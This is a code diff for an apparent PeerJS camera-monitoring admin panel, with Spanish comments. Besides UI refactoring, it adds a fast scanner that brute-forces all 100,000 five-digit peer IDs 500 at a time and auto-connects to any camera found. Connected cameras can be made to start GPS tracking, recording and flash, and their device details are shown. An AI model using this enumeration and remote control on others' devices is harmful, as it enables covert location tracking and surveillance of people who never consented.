+  if (cam.gps && badge) {
+    badge.textContent = `📍 ${(+cam.gps.lat).toFixed(5)}, ${(+cam.gps.lng).toFixed(5)} ±${cam.gps.acc != null ? (+cam.gps.acc).toFixed(0) : '?'}m`;
+  } else if (cam.gps && !badge) {
+    renderGrid(); // GPS llegó antes de que hubiera badge: re-render
+  }
 }
 
-// ── SELECTION ──
+// ── SELECCIÓN ──
 function selectCamera(id) {
   selectedId = id;
   document.querySelectorAll('.cam-item').forEach(el => el.classList.remove('active'));
-  document.querySelectorAll('.cam-cell').forEach(el => el.classList.remove('selected'));
-  const ci = document.getElementById(`ci-${id}`);
-  if (ci) ci.classList.add('active');
+  document.querySelectorAll('.cam-cell').forEach(el  => el.classList.remove('selected'));
+  const ci   = document.getElementById(`ci-${id}`);
+  if (ci)   ci.classList.add('active');
   const cell = document.getElementById(`cell-${id}`);
   if (cell) cell.classList.add('selected');
   renderDetailPanel();
 }
 
+// ── PANEL DERECHO ──
 function renderDetailPanel() {
   const cam = selectedId ? cameras[selectedId] : null;
+
   if (cam && cam.status === 'live') {
-    document.getElementById('noSelectionMsg').style.display = 'none';
-    document.getElementById('detailContent').style.display = 'block';
+    document.getElementById('noSelectionMsg').style.display  = 'none';
+    document.getElementById('detailContent').style.display   = 'block';
     document.getElementById('detail-name').textContent = cam.name;
-    document.getElementById('detail-id').textContent = 'ID: ' + cam.id;
+    document.getElementById('detail-id').textContent   = 'ID: ' + cam.id;
     updateDetailStats();
     document.getElementById('controlsContent').style.display = 'none';
-    document.getElementById('controlsActive').style.display = 'block';
+    document.getElementById('controlsActive').style.display  = 'block';
     bindControls(selectedId);
   } else {
-    document.getElementById('noSelectionMsg').style.display = 'block';
-    document.getElementById('detailContent').style.display = 'none';
+    document.getElementById('noSelectionMsg').style.display  = 'block';
+    document.getElementById('detailContent').style.display   = 'none';
     document.getElementById('controlsContent').style.display = 'block';
     document.getElementById('controlsContent').innerHTML = '<div class="no-selection">Sin cámara activa</div>';
-    document.getElementById('controlsActive').style.display = 'none';
+    document.getElementById('controlsActive').style.display  = 'none';
   }
-  renderGpsPanel(); renderDevicePanel();
+  renderGpsPanel();
+  renderDevicePanel();
 }
 
 function updateDetailStats() {
   const cam = selectedId ? cameras[selectedId] : null;
   if (!cam) return;
   const s = cam.stats;
-  document.getElementById('d-lat').textContent = s.lat || '—';
-  document.getElementById('d-bit').textContent = s.bit || '—';
-  document.getElementById('d-pkt').textContent = s.pkt || '—';
-  document.getElementById('d-q').textContent   = s.q   || '—';
-  document.getElementById('d-res').textContent = s.res || '—';
+  document.getElementById('d-lat').textContent  = s.lat  || '—';
+  document.getElementById('d-bit').textContent  = s.bit  || '—';
+  document.getElementById('d-pkt').textContent  = s.pkt  || '—';
+  document.getElementById('d-q').textContent    = s.q    || '—';
+  document.getElementById('d-res').textContent  = s.res  || '—';
   document.getElementById('d-time').textContent = s.time || '—';
   const qEl = document.getElementById('d-q');
-  qEl.className = 'info-card-val ' + (s.q==='Excelente' ? 'g' : s.q==='Buena' ? 'y' : '');
+  qEl.className = 'info-card-val ' + (s.q === 'Excelente' ? 'g' : s.q === 'Buena' ? 'y' : '');
 }
 
 function renderGpsPanel() {
   const cam = selectedId ? cameras[selectedId] : null;
-  const gps = cam ? cam.gps : null;
+  const gps = cam?.gps;
   if (!gps) {
     document.getElementById('gpsNoData').style.display = 'block';
     document.getElementById('gpsCard').style.display   = 'none';
@@ -974,12 +1064,12 @@ function renderGpsPanel() {
   document.getElementById('gpsNoData').style.display = 'none';
   document.getElementById('gpsCard').style.display   = 'block';
   document.getElementById('gpsMapBtn').style.display = 'flex';
-  document.getElementById('g-lat').textContent  = gps.lat != null ? (+gps.lat).toFixed(6) : '—';
-  document.getElementById('g-lng').textContent  = gps.lng != null ? (+gps.lng).toFixed(6) : '—';
-  document.getElementById('g-acc').textContent  = gps.acc != null ? (+gps.acc).toFixed(0)+'m' : '—';
-  document.getElementById('g-alt').textContent  = gps.alt != null ? (+gps.alt).toFixed(0)+'m' : '—';
-  document.getElementById('g-spd').textContent  = gps.spd != null ? ((+gps.spd)*3.6).toFixed(1)+' km/h' : '—';
-  document.getElementById('g-head').textContent = gps.head != null ? (+gps.head).toFixed(0)+'°' : '—';
+  document.getElementById('g-lat').textContent  = gps.lat  != null ? (+gps.lat).toFixed(6)  : '—';
+  document.getElementById('g-lng').textContent  = gps.lng  != null ? (+gps.lng).toFixed(6)  : '—';
+  document.getElementById('g-acc').textContent  = gps.acc  != null ? (+gps.acc).toFixed(0)  + 'm' : '—';
+  document.getElementById('g-alt').textContent  = gps.alt  != null ? (+gps.alt).toFixed(0)  + 'm' : '—';
+  document.getElementById('g-spd').textContent  = gps.spd  != null ? ((+gps.spd) * 3.6).toFixed(1) + ' km/h' : '—';
+  document.getElementById('g-head').textContent = gps.head != null ? (+gps.head).toFixed(0) + '°' : '—';
   document.getElementById('gpsMapBtn').onclick = () => {
     window.open(`https://www.google.com/maps?q=${gps.lat},${gps.lng}&z=17`, '_blank');
   };
@@ -987,16 +1077,17 @@ function renderGpsPanel() {
 
 function renderDevicePanel() {
   const cam = selectedId ? cameras[selectedId] : null;
-  const d   = cam ? cam.deviceInfo : null;
+  const d   = cam?.deviceInfo;
   if (!d) {
-    document.getElementById('diWait').style.display  = 'block';
-    document.getElementById('diCard').style.display  = 'none';
+    document.getElementById('diWait').style.display = 'block';
+    document.getElementById('diCard').style.display = 'none';
     return;
   }
   document.getElementById('diWait').style.display = 'none';
   document.getElementById('diCard').style.display = 'block';
   const f = (id, val, cls) => {
-    const el = document.getElementById(id); if(!el) return;
+    const el = document.getElementById(id);
+    if (!el) return;
     el.textContent = val || '—';
     if (cls) el.className = 'di-val ' + cls;
   };
@@ -1004,8 +1095,8 @@ function renderDevicePanel() {
   f('di-browser',  d.browser);
   f('di-os',       d.os);
   f('di-screen',   d.screen);
-  f('di-mem',      d.memory ? d.memory+' GB' : null);
-  f('di-cpu',      d.cores ? d.cores+' núcleos' : null);
+  f('di-mem',      d.memory ? d.memory + ' GB' : null);
+  f('di-cpu',      d.cores  ? d.cores  + ' núcleos' : null);
   f('di-conn',     d.conn);
   f('di-lang',     d.lang);
   f('di-tz',       d.tz);
@@ -1013,36 +1104,32 @@ function renderDevicePanel() {
   f('di-online',   d.online ? 'Sí' : 'No', d.online ? 'g' : 'r');
 }
 
-// ── CONTROLS BIND ──
+// ── BIND CONTROLES ──
 function bindControls(camId) {
   const cam = cameras[camId];
   if (!cam) return;
   updateRemoteControlUI(camId);
 
-  // ── VOLTEAR (remoto) ──
+  // Voltear (remoto)
   document.getElementById('ctrl-remote-flip').onclick = () => {
-    const btn = document.getElementById('ctrl-remote-flip');
-    if (sendCamCommand(camId, 'flip')) {
-      btn.classList.add('act');
-      setTimeout(() => btn.classList.remove('act'), 800);
-      toast('Cámara volteada', 'info');
-    }
+    if (sendCamCommand(camId, 'flip')) toast('Volteando cámara…', 'info');
   };
 
-  // ── FLASH (remoto) ──
+  // Flash (remoto)
   document.getElementById('ctrl-remote-torch').onclick = () => {
+    const cam = cameras[camId];
     if (!cam) return;
-    const wantTorch = !cam.torchState;
-    if (sendCamCommand(camId, 'torch', wantTorch)) {
-      // Optimistically update; cmdAck will confirm
-      cam.torchState = wantTorch;
+    const want = !cam.torchState;
+    if (sendCamCommand(camId, 'torch', want)) {
+      cam.torchState = want; // Optimista; cmdAck lo confirma
       updateRemoteControlUI(camId);
-      toast(wantTorch ? 'Flash ON enviado' : 'Flash OFF enviado', 'info');
+      toast(want ? 'Flash ON enviado' : 'Flash OFF enviado', 'info');
     }
   };
 
-  // ── GPS (remoto) ──
+  // GPS (remoto)
   document.getElementById('ctrl-remote-gps').onclick = () => {
+    const cam = cameras[camId];
     if (!cam) return;
     const action = cam.gpsActive ? 'gps_stop' : 'gps_start';
     if (sendCamCommand(camId, action)) {
@@ -1053,139 +1140,147 @@ function bindControls(camId) {
     }
   };
 
-  // ── SNAPSHOT (admin-side: capture from viewer video) ──
+  // Snapshot (local)
   document.getElementById('ctrl-snap').onclick = () => snapCell(camId);
 
-  // ── PiP ──
+  // PiP
   document.getElementById('ctrl-pip').onclick = async () => {
     const gv = document.getElementById(`gvid-${camId}`);
     if (!gv) return;
     try {
       if (document.pictureInPictureElement) await document.exitPictureInPicture();
       else await gv.requestPictureInPicture();
-    } catch(e) { toast('PiP no disponible','error'); }
+    } catch (e) { toast('PiP no disponible', 'error'); }
   };
 
-  // ── GRABACIÓN (remoto — guarda en la cámara) ──
-  const recBtn = document.getElementById('ctrl-rec');
-  recBtn.onclick = () => {
+  // Grabación (remoto)
+  document.getElementById('ctrl-rec').onclick = () => {
+    const cam = cameras[camId];
     if (!cam) return;
     if (cam.isRecording) {
       if (sendCamCommand(camId, 'record_stop')) {
-        cam.isRecording = false;
-        updateRemoteControlUI(camId);
-        toast('Grabación detenida en cámara', 'info');
+        cam.isRecording = false; updateRemoteControlUI(camId);
+        toast('Detener grabación enviado', 'info');
       }
     } else {
       if (sendCamCommand(camId, 'record_start')) {
-        cam.isRecording = true;
-        updateRemoteControlUI(camId);
-        toast('Grabación iniciada en cámara', 'info');
+        cam.isRecording = true; updateRemoteControlUI(camId);
+        toast('Iniciar grabación enviado', 'info');
       }
     }
   };
 
-  // ── VOLUMEN (local en admin, no remoto) ──
+  // Volumen (local)
   const volSlider = document.getElementById('ctrl-vol');
   const volVal    = document.getElementById('ctrl-vol-val');
-  volSlider.value = cam.volume !== undefined ? cam.volume : 1;
-  volVal.textContent = Math.round(volSlider.value * 100) + '%';
-  volSlider.oninput = () => {
-    cam.volume = parseFloat(volSlider.value);
-    volVal.textContent = Math.round(cam.volume * 100) + '%';
-    const gv = document.getElementById(`gvid-${camId}`);
-    if (gv) gv.volume = cam.volume;
-  };
+  if (volSlider) {
+    volSlider.value = cam.volume ?? 1;
+    volVal.textContent = Math.round((cam.volume ?? 1) * 100) + '%';
+    volSlider.oninput = () => {
+      const cam = cameras[camId];
+      if (!cam) return;
+      cam.volume = parseFloat(volSlider.value);
+      volVal.textContent = Math.round(cam.volume * 100) + '%';
+      const gv = document.getElementById(`gvid-${camId}`);
+      if (gv) gv.volume = cam.volume;
+    };
+  }
 
-  // ── ZOOM (remoto) ──
+  // Zoom (remoto)
   const zoomSlider = document.getElementById('ctrl-zoom');
   const zoomVal    = document.getElementById('ctrl-zoom-val');
-  zoomSlider.value = cam.zoom || 1;
-  zoomVal.textContent = (cam.zoom || 1).toFixed(1) + '×';
-  let zoomDebounce;
-  zoomSlider.oninput = () => {
-    cam.zoom = parseFloat(zoomSlider.value);
-    zoomVal.textContent = cam.zoom.toFixed(1) + '×';
-    clearTimeout(zoomDebounce);
-    zoomDebounce = setTimeout(() => sendCamCommand(camId, 'zoom', cam.zoom), 150);
-  };
+  if (zoomSlider) {
+    zoomSlider.value = cam.zoom || 1;
+    zoomVal.textContent = (cam.zoom || 1).toFixed(1) + '×';
+    let zoomDebounce;
+    zoomSlider.oninput = () => {
+      const cam = cameras[camId];
+      if (!cam) return;
+      cam.zoom = parseFloat(zoomSlider.value);
+      zoomVal.textContent = cam.zoom.toFixed(1) + '×';
+      clearTimeout(zoomDebounce);
+      zoomDebounce = setTimeout(() => sendCamCommand(camId, 'zoom', cam.zoom), 150);
+    };
+  }
 
-  // ── BRILLO (remoto) ──
+  // Brillo (remoto + local preview)
   const briSlider = document.getElementById('ctrl-bri');
   const briVal    = document.getElementById('ctrl-bri-val');
-  briSlider.value = cam.brightness || 1;
-  briVal.textContent = (cam.brightness || 1).toFixed(2) + '×';
-  let briDebounce;
-  briSlider.oninput = () => {
-    cam.brightness = parseFloat(briSlider.value);
-    briVal.textContent = cam.brightness.toFixed(2) + '×';
-    // Also update local video filter for visual feedback on admin side
-    const gv = document.getElementById(`gvid-${camId}`);
-    if (gv) gv.style.filter = `brightness(${cam.brightness})`;
-    clearTimeout(briDebounce);
-    briDebounce = setTimeout(() => sendCamCommand(camId, 'brightness', cam.brightness), 150);
-  };
+  if (briSlider) {
+    briSlider.value = cam.brightness || 1;
+    briVal.textContent = (cam.brightness || 1).toFixed(2) + '×';
+    let briDebounce;
+    briSlider.oninput = () => {
+      const cam = cameras[camId];
+      if (!cam) return;
+      cam.brightness = parseFloat(briSlider.value);
+      briVal.textContent = cam.brightness.toFixed(2) + '×';
+      const gv = document.getElementById(`gvid-${camId}`);
+      if (gv) gv.style.filter = `brightness(${cam.brightness})`;
+      clearTimeout(briDebounce);
+      briDebounce = setTimeout(() => sendCamCommand(camId, 'brightness', cam.brightness), 150);
+    };
+  }
 
-  // ── DESCONECTAR ──
+  // Desconectar
   document.getElementById('ctrl-disconnect').onclick = () => {
     removeCam(camId, `Cámara ${camId} desconectada`);
   };
 }
 
-// Updates button visual states for remote controls
 function updateRemoteControlUI(camId) {
   const cam = cameras[camId];
   if (!cam) return;
 
-  // Torch button
   const torchBtn = document.getElementById('ctrl-remote-torch');
   if (torchBtn) {
     torchBtn.className = 'ctrl-btn' + (cam.torchState ? ' act-yellow' : '');
     torchBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
-    </svg>${cam.torchState ? 'Flash ON' : 'Flash'}`;
+      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+      ${cam.torchState ? 'Flash ON' : 'Flash'}`;
   }
 
-  // GPS button
   const gpsBtn = document.getElementById('ctrl-remote-gps');
   if (gpsBtn) {
     gpsBtn.className = 'ctrl-btn' + (cam.gpsActive ? ' act-green' : '');
     gpsBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
       <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/>
-    </svg>${cam.gpsActive ? 'GPS ON' : 'GPS'}`;
+      </svg>${cam.gpsActive ? 'GPS ON' : 'GPS'}`;
   }
 
-  // Rec button
   const recBtn = document.getElementById('ctrl-rec');
   if (recBtn) {
     if (cam.isRecording) {
       recBtn.classList.add('rec-active');
-      recBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" fill="currentColor"/></svg> Detener Grabación`;
+      recBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <rect x="3" y="3" width="18" height="18" rx="2" fill="currentColor"/></svg> Detener Grabación`;
     } else {
       recBtn.classList.remove('rec-active');
-      recBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg> Iniciar Grabación (en cámara)`;
+      recBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>
+        Iniciar Grabación (en cámara)`;
     }
   }
 }
 
-// ── SNAPSHOT (admin-side) ──
+// ── SNAPSHOT ──
 function snapCell(camId, event) {
   if (event) event.stopPropagation();
   const gv = document.getElementById(`gvid-${camId}`);
-  if (!gv) return;
+  if (!gv || !gv.videoWidth) { toast('Sin video disponible', 'error'); return; }
   const canvas = document.createElement('canvas');
-  canvas.width  = gv.videoWidth  || 1280;
-  canvas.height = gv.videoHeight || 720;
+  canvas.width  = gv.videoWidth;
+  canvas.height = gv.videoHeight;
   canvas.getContext('2d').drawImage(gv, 0, 0);
-  const ts = new Date().toISOString().replace(/[:.]/g,'-').slice(0,-5);
+  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
   canvas.toBlob(blob => {
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = `streamlink-admin-cap-${camId}-${ts}.png`;
+    a.download = `streamlink-cap-${camId}-${ts}.png`;
     a.click();
     URL.revokeObjectURL(a.href);
+    toast(`Captura guardada (Cam ${camId})`, 'success');
   }, 'image/png');
-  toast(`Captura guardada (Cam ${camId})`, 'success');
 }
 
 function focusCell(camId, event) {
@@ -1202,85 +1297,155 @@ function setLayout(n) {
   document.querySelectorAll('.view-btn').forEach(b => b.classList.remove('active'));
   const lbtn = document.getElementById('vb-' + n);
   if (lbtn) lbtn.classList.add('active');
-  const labels = {1:'1×1',2:'1×2',4:'2×2',9:'3×3',auto:'Auto'};
+  const labels = { 1: '1×1', 2: '1×2', 4: '2×2', 9: '3×3', auto: 'Auto' };
   document.getElementById('layoutLabel').textContent = labels[n] || n;
   renderGrid();
 }
 function toggleAllFullscreen() {
   const area = document.getElementById('gridArea');
-  if (!document.fullscreenElement) area.requestFullscreen().catch(()=>{});
+  if (!document.fullscreenElement) area.requestFullscreen().catch(() => {});
   else document.exitFullscreen();
 }
 
-// ── AUTO SCANNER ──
+// ══════════════════════════════════════════════════════════
+//  AUTO SCANNER OPTIMIZADO
+//  Estrategia: lotes de 500 conexiones paralelas simultáneas
+//  con timeout de 900ms por peer → cubre 100.000 IDs en ~3 min
+// ══════════════════════════════════════════════════════════
+const SCAN_CONCURRENCY = 500;  // conexiones simultáneas
+const SCAN_TIMEOUT_MS  = 900;  // ms de espera por peer
+const SCAN_TOTAL       = 100000;
+
+let scanFoundCount = 0;
+let scanChecked    = 0;
+let scanStartTime  = 0;
+
 async function autoScan() {
   if (isScanning) { stopScan(); return; }
-  isScanning = true; scanAbort = false;
+  isScanning  = true;
+  scanAbort   = false;
+  scanFoundCount = 0;
+  scanChecked    = 0;
+  scanStartTime  = Date.now();
+
   document.getElementById('scanBtn').classList.add('scanning');
-  document.getElementById('scanBtnLabel').textContent = 'Detener escaneo';
-  setStatus('ESCANEANDO...', 'badge-scan');
-  toast('Escaneando rango 00000–99999…', 'info', 5000);
-  const BATCH = 10; const TOTAL = 100000;
-  let found = 0;
+  document.getElementById('scanBtnLabel').textContent = '■ Detener escaneo';
+  document.getElementById('scanStats').textContent = '';
+  updateTopStats();
+  toast('Escáner iniciado — 500 conexiones paralelas', 'info', 4000);
+
   initAdminPeer(async () => {
-    for (let start = 0; start < TOTAL; start += BATCH) {
-      if (scanAbort) break;
-      const pct = Math.min(100, Math.round(start / TOTAL * 100));
+    // Genera array de todos los IDs aleatorizado para distribución uniforme
+    // (mejor probabilidad de encontrar cámaras rápido al inicio)
+    const allIds = Array.from({ length: SCAN_TOTAL }, (_, i) => i.toString().padStart(5, '0'));
+    shuffleArray(allIds);
+
+    // Procesa en lotes de SCAN_CONCURRENCY
+    for (let offset = 0; offset < SCAN_TOTAL && !scanAbort; offset += SCAN_CONCURRENCY) {
+      const batch = allIds.slice(offset, offset + SCAN_CONCURRENCY).filter(id => !cameras[id]);
+      if (batch.length === 0) { scanChecked += SCAN_CONCURRENCY; continue; }
+
+      await Promise.allSettled(batch.map(id => probePeerFast(id)));
+
+      scanChecked = Math.min(offset + SCAN_CONCURRENCY, SCAN_TOTAL);
+      const pct   = Math.round((scanChecked / SCAN_TOTAL) * 100);
+      const elapsed = ((Date.now() - scanStartTime) / 1000).toFixed(0);
+      const eta     = elapsed > 0
+        ? Math.round(elapsed / (scanChecked / SCAN_TOTAL) - elapsed)
+        : '?';
+
       document.getElementById('scanProgressBar').style.width = pct + '%';
-      document.getElementById('scanBtnLabel').textContent = `Escaneando… ${start.toString().padStart(5,'0')} (${pct}%)`;
-      const batch = [];
-      for (let i = start; i < Math.min(start + BATCH, TOTAL); i++) batch.push(i.toString().padStart(5,'0'));
-      await Promise.all(batch.map(id => probePeer(id)));
-      await new Promise(r => setTimeout(r, 50));
+      document.getElementById('scanBtnLabel').textContent = `■ Detener — ${pct}%`;
+      document.getElementById('scanStats').textContent =
+        `${scanChecked.toLocaleString()} de ${SCAN_TOTAL.toLocaleString()} · ${scanFoundCount} halladas · ETA ${eta}s`;
+
+      // Pequeña pausa entre lotes para no saturar el navegador
+      if (!scanAbort) await new Promise(r => setTimeout(r, 20));
     }
+
     if (!scanAbort) {
       document.getElementById('scanProgressBar').style.width = '100%';
-      toast(found > 0 ? `Escaneo completo. ${found} cámara(s) encontrada(s).` : 'Escaneo completo. Sin cámaras detectadas.', found > 0 ? 'success' : 'info');
+      const elapsed = ((Date.now() - scanStartTime) / 1000).toFixed(1);
+      toast(
+        scanFoundCount > 0
+          ? `✓ Escaneo completo en ${elapsed}s — ${scanFoundCount} cámara(s) encontrada(s)`
+          : `Escaneo completo en ${elapsed}s — Sin cámaras detectadas`,
+        scanFoundCount > 0 ? 'success' : 'info',
+        5000
+      );
     }
     stopScan();
   });
-  function probePeer(id) {
-    if (cameras[id]) return Promise.resolve();
-    return new Promise(resolve => {
-      const conn = adminPeer.connect(id, { reliable: false, label: 'probe' });
-      const t = setTimeout(() => { try { conn.close(); } catch(e){} resolve(); }, 2500);
-      conn.on('open', () => {
-        clearTimeout(t);
-        try { conn.close(); } catch(e) {}
-        if (!cameras[id] && !scanAbort) { found++; connectCamera(id); }
-        resolve();
-      });
-      conn.on('error', () => { clearTimeout(t); resolve(); });
-    });
-  }
 }
+
+function probePeerFast(id) {
+  if (cameras[id]) return Promise.resolve();
+  return new Promise(resolve => {
+    let done = false;
+    const finish = () => { if (!done) { done = true; resolve(); } };
+
+    let conn;
+    try {
+      conn = adminPeer.connect(id, { reliable: false, label: 'probe', serialization: 'none' });
+    } catch (e) { return finish(); }
+
+    const timer = setTimeout(() => {
+      try { conn?.close(); } catch (e) {}
+      finish();
+    }, SCAN_TIMEOUT_MS);
+
+    conn.on('open', () => {
+      clearTimeout(timer);
+      try { conn.close(); } catch (e) {}
+      if (!cameras[id] && !scanAbort) {
+        scanFoundCount++;
+        connectCamera(id);
+      }
+      finish();
+    });
+    conn.on('error', () => { clearTimeout(timer); finish(); });
+  });
+}
+
+// Fisher-Yates shuffle para aleatorizar el orden de IDs
+function shuffleArray(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
 function stopScan() {
-  isScanning = false; scanAbort = true;
+  isScanning = false;
+  scanAbort  = true;
   document.getElementById('scanBtn').classList.remove('scanning');
   document.getElementById('scanBtnLabel').textContent = 'Escanear rango (00000–99999)';
   document.getElementById('scanProgressBar').style.width = '0%';
+  document.getElementById('scanStats').textContent = '';
   updateTopStats();
 }
 
-// ── EVENTS ──
+// ── EVENTOS ──
 document.getElementById('addCamBtn').addEventListener('click', () => {
   const code = document.getElementById('manualCode').value.trim();
-  connectCamera(code);
-  document.getElementById('manualCode').value = '';
+  if (code) {
+    connectCamera(code);
+    document.getElementById('manualCode').value = '';
+  }
 });
 document.getElementById('manualCode').addEventListener('keydown', e => {
-  e.target.value = e.target.value.replace(/\D/g,'').slice(0,5);
   if (e.key === 'Enter') document.getElementById('addCamBtn').click();
 });
 document.getElementById('manualCode').addEventListener('input', e => {
-  e.target.value = e.target.value.replace(/\D/g,'').slice(0,5);
+  e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
 });
 document.getElementById('scanBtn').addEventListener('click', autoScan);
 
 // ── INIT ──
 initAdminPeer(() => {
   setStatus('LISTO', 'badge-live');
-  toast('Admin panel listo', 'success');
+  toast('Admin panel listo', 'success', 2000);
 });
 updateTopStats();
 renderDetailPanel();
